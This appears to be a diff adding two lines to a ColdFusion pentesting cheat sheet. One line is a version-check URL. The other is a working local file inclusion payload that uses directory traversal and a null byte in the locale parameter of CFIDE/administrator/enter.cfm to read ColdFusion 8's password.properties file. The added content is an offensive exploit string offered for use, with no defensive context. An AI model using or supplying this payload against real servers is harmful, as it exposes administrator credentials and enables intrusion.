@@ -1,0 +1,2 @@
+- `check version /CFIDE/adminapi/base.cfc?wsdl`
+- `fckeditor Version 8  LFI > http://server/CFIDE/administrator/enter.cfm?locale=../../../../../../../../../../ColdFusion8/lib/password.properties%00en`
